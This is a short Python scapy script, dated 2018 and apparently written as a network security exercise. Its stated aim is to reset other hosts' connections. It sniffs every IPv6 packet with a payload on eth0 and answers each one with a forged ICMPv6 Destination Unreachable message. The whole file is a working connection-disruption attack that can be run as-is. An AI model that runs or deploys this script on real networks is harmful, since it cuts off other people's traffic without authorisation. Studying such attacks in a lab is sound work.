#!/usr/bin/python

# Jack Cardwell
# February 12, 2018

# unreachable.py sends unreachable messages in response to every packet out there in an attempt to reset the connection

# LIBRARY IMPORTS
from scapy.all import *
from sys import *

def handlePacket(packet):

    if packet.haslayer(IPv6) and packet.haslayer(Raw):

        print("Received Packet")
        # get the ip portion of the packet
        ip = packet.getlayer(IPv6)
        response = IPv6(dst = ip.src)
        data = packet.getlayer(Raw)

        icmp = ICMPv6DestUnreach()


        packet = (response/icmp/Raw(load=data.load))
        print("Sent Infiltration Packet")
        send(packet)



# listen for all messages on the "eth0" interface
sniff(iface = "eth0", prn = handlePacket)
